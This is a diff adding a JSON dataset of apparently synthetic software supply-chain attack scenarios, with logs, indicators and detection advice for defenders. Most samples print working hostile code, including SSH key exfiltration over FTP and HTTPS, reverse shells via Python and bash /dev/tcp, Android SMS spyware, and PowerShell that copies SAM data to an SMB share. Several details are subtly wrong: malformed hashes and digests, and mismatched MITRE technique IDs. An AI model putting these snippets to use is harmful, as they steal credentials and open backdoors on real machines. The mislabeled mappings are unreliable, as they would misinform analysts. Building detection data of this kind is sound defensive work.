@@ -1,0 +1,368 @@
+{
+  "samples": [
+    {
+      "scenario": "Attackers injected malicious payload into a widely-used Python package hosted on PyPI by compromising the maintainer's credentials. The payload collects SSH keys from affected machines and transmits them to an attacker-controlled FTP server upon package installation.",
+      "technical_data": {
+        "package_manifest": {
+          "name": "data-analyzer",
+          "version": "1.4.7",
+          "hash": "sha256:5a1d2b4c7e9f3d8a1b2c3d4e5f67890abcdef1234567890abcdef1234567890ab",
+          "dependencies": {
+            "numpy": ">=1.18.0",
+            "requests": ">=2.22.0"
+          }
+        },
+        "malicious_code_snippet": "import ftplib, os\n\ndef exfiltrate():\n    ftp = ftplib.FTP('ftp.malicious-server.com')\n    ftp.login('anonymous', '')\n    with open(os.path.expanduser('~/.ssh/id_rsa'), 'rb') as keyfile:\n        ftp.storbinary('STOR id_rsa', keyfile)\n    ftp.quit()\n\nexfiltrate()",
+        "package_install_log": "2024-05-25 11:03:54 INFO Installed data-analyzer 1.4.7 from PyPI",
+        "pip_registry_log": "2024-05-25T11:02:33.456Z INFO package publish data-analyzer@1.4.7 by user compromised_maintainer",
+        "code_signing_verification_log": "ERROR 2024-05-25 11:03:55 No code signing signature found for data-analyzer@1.4.7",
+        "sbom_record": "Component: data-analyzer\nVersion: 1.4.7\nSupplier: PyPI\nChecksum: sha256:5a1d2b4c7e9f3d8a1b2c3d4e5f67890abcdef1234567890abcdef1234567890ab\nLicense: BSD-3-Clause"
+      },
+      "indicators": [
+        "Package published by unexpected user with compromised credentials",
+        "Presence of FTP exfiltration code in package __init__.py",
+        "No code signing signature present for package version",
+        "Unusual outbound FTP connection during package installation",
+        "Mismatch between package checksum and known good baseline"
+      ],
+      "detection_method": "Monitor PyPI upload events for anomalous user activity; scan package contents for network-related code accessing sensitive files; verify package signatures or use reproducible builds; monitor outbound FTP connections from build and runtime environments.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.004 - Application Layer Protocol: FTP"
+      ]
+    },
+    {
+      "scenario": "A threat actor compromised the update pipeline of a widely used Linux package manager repository mirror and inserted a backdoor into a popular system utility update. The backdoor opens a reverse shell to a hardcoded IP address when the utility is executed with special arguments.",
+      "technical_data": {
+        "package_metadata": {
+          "name": "sys-util",
+          "version": "2.8.0",
+          "checksum": "sha256:9f8e7d6c5b4a3210fedcba9876543210abcdefabcdef1234567890abcdefabcd"
+        },
+        "malicious_code_snippet": "import socket, subprocess, sys\n\nif '--debug' in sys.argv:\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('198.51.100.99',4444))\n    while True:\n        cmd = s.recv(1024).decode()\n        if cmd.lower() == 'exit': break\n        output = subprocess.getoutput(cmd)\n        s.send(output.encode())\n    s.close()",
+        "package_manifest": {
+          "files": [
+            "sys-util",
+            "README.md"
+          ],
+          "checksums": {
+            "sys-util": "sha256:9f8e7d6c5b4a3210fedcba9876543210abcdefabcdef1234567890abcdefabcd"
+          }
+        },
+        "repository_logs": [
+          "2024-06-01T08:15:12Z INFO Package sys-util 2.8.0 mirrored from upstream",
+          "2024-06-01T08:20:45Z ERROR Integrity check failed for sys-util 2.8.0 during mirror sync"
+        ],
+        "network_logs": [
+          "2024-06-01T09:00:00 Connection established from 10.0.0.5 to 198.51.100.99:4444"
+        ],
+        "process_tree": [
+          "init -> sys-util --debug -> reverse_shell_connection"
+        ]
+      },
+      "indicators": [
+        "Integrity check failure during repository mirror sync",
+        "Presence of reverse shell code triggered by command-line argument",
+        "Outgoing reverse shell connection to suspicious IP at port 4444",
+        "Process execution chain shows unexpected network connection",
+        "Repository logs report error during update mirroring"
+      ],
+      "detection_method": "Monitor repository mirror integrity checks and alerts; scan update binaries for suspicious command-line triggered behaviors; monitor outbound connections to uncommon IP addresses and ports; analyze process trees for unexpected network activity triggered by system utilities.",
+      "relevant_mitre_techniques": [
+        "T1195.003 - Supply Chain Compromise: Compromise Repository",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1573.001 - Encrypted Channel: Symmetric Cryptography"
+      ]
+    },
+    {
+      "scenario": "An attacker compromised the central artifact repository used for internal Java builds, injecting malicious bytecode into the core logging library. This bytecode collects and sends JVM system properties and classpath information to a remote HTTP server controlled by the attacker.",
+      "technical_data": {
+        "maven_pom": {
+          "groupId": "com.example.logging",
+          "artifactId": "core-logger",
+          "version": "4.0.0"
+        },
+        "malicious_bytecode_snippet": "public class Logger {\n  static {\n    try {\n      java.net.URL url = new java.net.URL(\"http://attacker.example.com/collect\");\n      java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();\n      conn.setRequestMethod(\"POST\");\n      conn.setDoOutput(true);\n      String data = System.getProperties().toString() + System.getProperty(\"java.class.path\");\n      conn.getOutputStream().write(data.getBytes());\n      conn.getInputStream().close();\n    } catch(Exception e) { }\n  }\n}",
+        "artifact_repository_log": "2024-05-28T13:47:22 INFO Deployed core-logger-4.0.0.jar by user buildadmin",
+        "checksum": "sha256:2b7e151628aed2a6abf7158809cf4f3c762e7160f38c9de4e2f5b4f9a6a5a1c3",
+        "artifact_metadata": {
+          "jar_name": "core-logger-4.0.0.jar",
+          "signature_valid": false,
+          "checksum": "sha256:2b7e151628aed2a6abf7158809cf4f3c762e7160f38c9de4e2f5b4f9a6a5a1c3"
+        },
+        "network_capture_http": "POST /collect HTTP/1.1\r\nHost: attacker.example.com\r\nContent-Length: 256\r\n\r\n{java.system.properties and classpath data}",
+        "build_log": "2024-05-28 14:00:01 WARN Jar signature missing or invalid for core-logger-4.0.0.jar"
+      },
+      "indicators": [
+        "Invalid or missing signature on Java artifact core-logger-4.0.0.jar",
+        "Presence of HTTP POST data exfiltrating JVM system properties",
+        "Artifact repository logs showing deployment by buildadmin at abnormal time",
+        "Network traffic with suspicious POST requests to attacker domain",
+        "Checksum mismatch compared to baseline artifact"
+      ],
+      "detection_method": "Enforce artifact signature verification in CI/CD pipelines; monitor artifact repository deployment logs for anomalies; inspect Java bytecode for network activity in core libraries; capture and analyze outbound HTTP requests from build agents.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1041 - Exfiltration Over C2 Channel"
+      ]
+    },
+    {
+      "scenario": "A malicious actor compromised the container image build process for a popular Kubernetes operator by injecting a reverse shell script in the container entrypoint. The compromised image was pushed to a public container registry and pulled by multiple organizations.",
+      "technical_data": {
+        "container_image_manifest": {
+          "name": "k8s-operator",
+          "tag": "v2.3.4",
+          "digest": "sha256:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7g8h"
+        },
+        "dockerfile_snippet": "ENTRYPOINT [\"/bin/sh\", \"-c\", \"if [ \\\"$ENABLE_BACKDOOR\\\" = \\\"1\\\" ]; then /bin/sh -i >& /dev/tcp/203.0.113.55/5555 0>&1; else /usr/local/bin/operator; fi\"]",
+        "container_registry_logs": [
+          "2024-05-30T16:45:00Z INFO Push image k8s-operator:v2.3.4 by user compromised_builder"
+        ],
+        "network_traffic": "TCP connection from container runtime host to 203.0.113.55:5555",
+        "runtime_process_list": [
+          "operator",
+          "sh -i >& /dev/tcp/203.0.113.55/5555 0>&1"
+        ],
+        "sbom_record": "Component: k8s-operator\nVersion: v2.3.4\nSupplier: Internal Build System\nChecksum: sha256:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7g8h\nLicense: Apache-2.0"
+      },
+      "indicators": [
+        "Container image pushed by suspicious user",
+        "Dockerfile ENTRYPOINT contains reverse shell command",
+        "Outbound TCP connection on non-standard port 5555 to suspicious IP",
+        "Process list inside container includes interactive shell commands",
+        "SBOM shows unexpected script injected into entrypoint"
+      ],
+      "detection_method": "Audit container image build logs and user activity; scan container images for suspicious entrypoint commands; monitor outbound network connections from container runtimes; verify image digests and SBOM against trusted baselines.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "The attacker gained access to the update CI/CD pipeline of a popular Android application by compromising a third-party plugin repository. A malicious plugin was introduced that inserts spyware code into the app during build time, capturing SMS messages and sending them to a remote REST API.",
+      "technical_data": {
+        "gradle_plugin_info": {
+          "name": "analytics-plugin",
+          "version": "6.1.0",
+          "checksum": "sha256:abcde12345f67890abcdef1234567890abcdef1234567890abcdef1234567890"
+        },
+        "malicious_code_snippet": "public class Spyware {\n  public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\")) {\n      SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);\n      for (SmsMessage msg : msgs) {\n        sendToServer(msg.getMessageBody());\n      }\n    }\n  }\n\n  private void sendToServer(String message) {\n    OkHttpClient client = new OkHttpClient();\n    Request request = new Request.Builder()\n      .url(\"https://spy-server.example.com/api/logs\")\n      .post(RequestBody.create(message, MediaType.parse(\"text/plain\")))\n      .build();\n    client.newCall(request).execute();\n  }\n}",
+        "ci_cd_logs": [
+          "2024-05-29T22:30:00Z INFO Plugin analytics-plugin@6.1.0 downloaded from plugin-repo.example.com",
+          "2024-05-29T22:31:05Z WARN Code signing verification failed for analytics-plugin@6.1.0"
+        ],
+        "network_logs": [
+          "2024-05-29T22:35:10 POST https://spy-server.example.com/api/logs 200 OK"
+        ],
+        "build_manifest": {
+          "plugins": [
+            "analytics-plugin@6.1.0",
+            "firebase-plugin@7.0.0"
+          ]
+        },
+        "app_permissions": [
+          "android.permission.RECEIVE_SMS",
+          "android.permission.INTERNET"
+        ]
+      },
+      "indicators": [
+        "Plugin downloaded from third-party repository with failed signature verification",
+        "Presence of SMS interception and exfiltration code in app build",
+        "Outbound HTTPS POST requests to suspicious server during app runtime",
+        "CI/CD logs show plugin download by compromised pipeline identity",
+        "App requests RECEIVE_SMS permission unexpectedly"
+      ],
+      "detection_method": "Enforce strict code signing and plugin source verification in build pipelines; scan app source and compiled code for sensitive API usage; monitor network traffic from app instances for connections to unknown servers; review CI/CD pipeline logs for anomalous plugin downloads.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1406 - Exfiltration Over Command and Control Channel",
+        "T1436 - Mobile SMS Interception"
+      ]
+    },
+    {
+      "scenario": "An attacker gained access to the build pipeline of a widely used Python package repository mirror and inserted malicious code in a popular data processing library's wheels. The trojanized wheel sends compressed system metadata and user IP addresses to a remote server upon import.",
+      "technical_data": {
+        "package_metadata": {
+          "name": "data-cruncher",
+          "version": "1.5.7",
+          "hash": "sha256:5f4dcc3b5aa765d61d8327deb882cf99",
+          "dependencies": {
+            "numpy": ">=1.19.0",
+            "pandas": ">=1.1.0"
+          }
+        },
+        "malicious_code_snippet": "import socket, zlib, json, urllib.request\n\ndef exfiltrate():\n    info = {'hostname': socket.gethostname(), 'ip': socket.gethostbyname(socket.gethostname())}\n    data = zlib.compress(json.dumps(info).encode())\n    urllib.request.urlopen('https://evil.example.com/collect', data=data)\n\nexfiltrate()",
+        "wheel_contents": [
+          "data_cruncher/__init__.py",
+          "data_cruncher/core.py",
+          "data_cruncher/utils.py"
+        ],
+        "package_hashes": {
+          "data-cruncher-1.5.7-py3-none-any.whl": "sha256:5f4dcc3b5aa765d61d8327deb882cf99"
+        },
+        "pypi_mirror_log": "2024-06-01T08:45:12.456Z INFO mirrored package data-cruncher-1.5.7 from upstream",
+        "code_signing_check": "ERROR 2024-06-01 08:46:01 Signature verification failed for data-cruncher-1.5.7 wheel",
+        "sbom_record": "Component: data-cruncher\nVersion: 1.5.7\nSupplier: PyPI mirror\nChecksum: sha256:5f4dcc3b5aa765d61d8327deb882cf99\nLicense: Apache-2.0\n"
+      },
+      "indicators": [
+        "Wheel package data-cruncher 1.5.7 with signature verification failure",
+        "Unexpected network connection to https://evil.example.com/collect on package import",
+        "Malicious compression of system metadata before exfiltration",
+        "PyPI mirror logs show mirrored version with suspicious timing",
+        "SBOM checksum mismatch compared to upstream PyPI baseline"
+      ],
+      "detection_method": "Validate package signatures from upstream PyPI and verify checksums on mirror; monitor runtime network activity for unusual connections on package import; audit build pipeline logs for unauthorized access; compare SBOMs from mirror and official sources.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1584.006 - Compromise Software Supply Chain: Compromise Software Dependencies"
+      ]
+    },
+    {
+      "scenario": "A threat actor compromised a popular container image registry and embedded a backdoor in a widely used base image by modifying the entrypoint script to launch a hidden reverse shell on container startup.",
+      "technical_data": {
+        "container_image": {
+          "name": "ubuntu-base",
+          "tag": "20.04-latest",
+          "digest": "sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+        },
+        "dockerfile_diff": "Modified ENTRYPOINT script to include:\n\n/bin/bash -c 'nohup bash -i >& /dev/tcp/attacker.example.com/4444 0>&1 &' && exec /bin/bash",
+        "container_manifest": {
+          "schemaVersion": 2,
+          "config": {
+            "digest": "sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
+          },
+          "layers": [
+            {
+              "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+              "digest": "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+            }
+          ]
+        },
+        "registry_access_log": [
+          "2024-05-25T23:59:59Z PATCH /v2/ubuntu-base/manifests/20.04-latest by user registryadmin",
+          "2024-05-26T00:01:05Z GET /v2/ubuntu-base/manifests/20.04-latest"
+        ],
+        "network_capture": "TCP SYN from container to attacker.example.com:4444 immediately on startup",
+        "sbom_record": "Component: ubuntu-base\nVersion: 20.04-latest\nSupplier: Docker Hub\nChecksum: sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\nLicense: GPL-2.0\n"
+      },
+      "indicators": [
+        "Container image ubuntu-base 20.04-latest with modified entrypoint launching reverse shell",
+        "Unexpected TCP connection to attacker.example.com port 4444 on container start",
+        "Registry access logs show suspicious PATCH action by privileged user",
+        "SBOM checksum does not match official Docker Hub baseline",
+        "Network captures reveal immediate outbound shell connection"
+      ],
+      "detection_method": "Monitor container registry activity for unauthorized image modification; verify image digests and entrypoint scripts against official baselines; use network monitoring to detect unusual outbound connections from containers; audit user actions on registry.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell"
+      ]
+    },
+    {
+      "scenario": "A threat group injected a malicious script into the update package of a popular Linux system monitoring tool distributed via the vendor's official update server. The script collects SSH private keys and uploads them to an encrypted storage via HTTPS.",
+      "technical_data": {
+        "update_package": {
+          "name": "sysmon-tool",
+          "version": "2.9.4",
+          "checksum": "sha256:7e240de74fb1ed08fa08d38063f6a6a91462a815"
+        },
+        "malicious_script_snippet": "import os, requests\n\nkeys = []\nfor root, dirs, files in os.walk(os.path.expanduser('~/.ssh')):\n    for file in files:\n        if file.endswith('.pem') or file.endswith('.key'):\n            with open(os.path.join(root, file), 'r') as f:\n                keys.append(f.read())\n\npayload = {'keys': keys}\nrequests.post('https://secure-storage.evilcorp.net/upload', json=payload, verify=True)",
+        "update_log": [
+          "2024-05-30 12:00:00 INFO Update sysmon-tool version 2.9.4 downloaded from updates.vendor.com",
+          "2024-05-30 12:01:15 WARNING Script sysmon_update.py modified unexpectedly"
+        ],
+        "ssl_certificate_details": {
+          "subject": "CN=secure-storage.evilcorp.net",
+          "issuer": "Fake CA",
+          "valid_from": "2024-03-01T00:00:00Z",
+          "valid_to": "2025-03-01T00:00:00Z"
+        },
+        "sbom_record": "Component: sysmon-tool\nVersion: 2.9.4\nSupplier: Vendor Inc.\nChecksum: sha256:7e240de74fb1ed08fa08d38063f6a6a91462a815\nLicense: GPLv3\n"
+      },
+      "indicators": [
+        "Update package sysmon-tool 2.9.4 contains unexpected script exfiltrating SSH keys",
+        "HTTPS POST to secure-storage.evilcorp.net with new SSL cert issued by untrusted CA",
+        "Update logs show warnings of unexpected script modification",
+        "SBOM checksum mismatch from vendor baseline",
+        "Presence of code walking ~/.ssh directory and reading private keys"
+      ],
+      "detection_method": "Monitor update packages for unauthorized script changes; validate SSL certificates of remote endpoints; detect anomalous outbound HTTPS traffic with sensitive data; audit update logs for warnings; verify SBOM integrity and checksums.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Software Update",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1005 - Data from Local System"
+      ]
+    },
+    {
+      "scenario": "An attacker injected malicious code into a widely used Ruby gem during a compromised build process. The code opens a hidden TCP listener on a high port, allowing remote code execution when triggered with a specific command.",
+      "technical_data": {
+        "gem_specification": {
+          "name": "fast-serializer",
+          "version": "0.9.12",
+          "checksum": "sha256:3a7bd3e2360a3d0b0e3a1f2e860f0f3bc7a1b4c99f0a0f6b8e2e3a7c1f3d5a5e"
+        },
+        "malicious_code_snippet": "require 'socket'\n\nThread.new do\n  server = TCPServer.new('0.0.0.0', 47291)\n  loop do\n    client = server.accept\n    cmd = client.gets.chomp\n    if cmd == 'RUN'\n      client.puts `uname -a`\n    else\n      client.puts 'INVALID COMMAND'\n    end\n    client.close\n  end\nend",
+        "build_pipeline_log": "2024-05-28T18:32:10Z INFO build fast-serializer 0.9.12 by builduser\n2024-05-28T18:33:20Z WARN unexpected modification detected in lib/fast_serializer.rb",
+        "gem_install_log": "Installed fast-serializer 0.9.12 on 2024-05-29 07:45:00",
+        "network_activity_log": "Inbound TCP connection on port 47291 from 203.0.113.45 at 2024-05-30 09:00:00",
+        "sbom_record": "Component: fast-serializer\nVersion: 0.9.12\nSupplier: RubyGems\nChecksum: sha256:3a7bd3e2360a3d0b0e3a1f2e860f0f3bc7a1b4c99f0a0f6b8e2e3a7c1f3d5a5e\nLicense: MIT\n"
+      },
+      "indicators": [
+        "Ruby gem fast-serializer 0.9.12 opens hidden TCP listener on port 47291",
+        "Build logs indicate unexpected source code modification",
+        "Inbound network connection attempts to unusual high port",
+        "SBOM checksum mismatch from RubyGems official baseline",
+        "Presence of code executing shell commands on remote trigger"
+      ],
+      "detection_method": "Monitor build pipelines for unauthorized source changes; scan installed gems for unexpected network listeners; audit inbound connections to unusual ports; verify gem checksums against trusted sources; alert on remote code execution patterns.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1043 - Commonly Used Port"
+      ]
+    },
+    {
+      "scenario": "A threat actor exploited a compromised CI/CD server to inject a malicious PowerShell script into the MSI installer of a popular Windows system utility. The script collects credential hashes and uploads them over SMB to a remote server.",
+      "technical_data": {
+        "installer_details": {
+          "name": "sysutil-installer",
+          "version": "10.3.0",
+          "file_hashes": {
+            "sysutil-10.3.0.msi": {
+              "MD5": "9e107d9d372bb6826bd81d3542a419d6",
+              "SHA1": "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+              "SHA256": "ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c"
+            }
+          }
+        },
+        "malicious_powershell_snippet": "Invoke-Command -ScriptBlock { $hashes = Get-ChildItem 'HKLM:\\SAM' -Recurse; $hashes | Out-File C:\\Windows\\Temp\\hashes.txt; New-PSDrive -Name X -PSProvider FileSystem -Root \\\\192.168.56.100\\share; Copy-Item C:\\Windows\\Temp\\hashes.txt X:\\ }",
+        "ci_cd_logs": [
+          "2024-05-27 22:00:00 Build triggered for sysutil-installer 10.3.0",
+          "2024-05-27 22:05:30 Warning: Unrecognized script added to installer packaging step",
+          "2024-05-27 22:10:00 Build completed successfully"
+        ],
+        "network_traffic": "SMB connection established from host to 192.168.56.100, transferring file hashes.txt",
+        "code_signing_verification": "FAIL 2024-05-27 22:15:00 Signature validation failed for sysutil-installer 10.3.0 MSI",
+        "sbom_record": "Component: sysutil-installer\nVersion: 10.3.0\nSupplier: Vendor Corp\nChecksum: ef537f25c895bfa782526529a9b63d97aa631564d5d789c2b765448c8635fb6c\nLicense: Proprietary\n"
+      },
+      "indicators": [
+        "MSI installer sysutil-installer 10.3.0 contains unauthorized PowerShell script",
+        "CI/CD logs show warnings of unexpected script injection",
+        "SMB outbound connection transferring credential hash files",
+        "Code signing verification failure on MSI installer",
+        "SBOM checksum does not match official vendor baseline"
+      ],
+      "detection_method": "Monitor CI/CD pipelines for unauthorized script inserts; verify MSI package signatures and contents; detect unusual SMB connections especially transferring sensitive files; audit build logs for warnings; compare SBOMs with vendor baseline.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Software Update",
+        "T1071.002 - Application Layer Protocol: SMB/Windows Admin Shares",
+        "T1003 - Credential Dumping"
+      ]
+    }
+  ]
+}
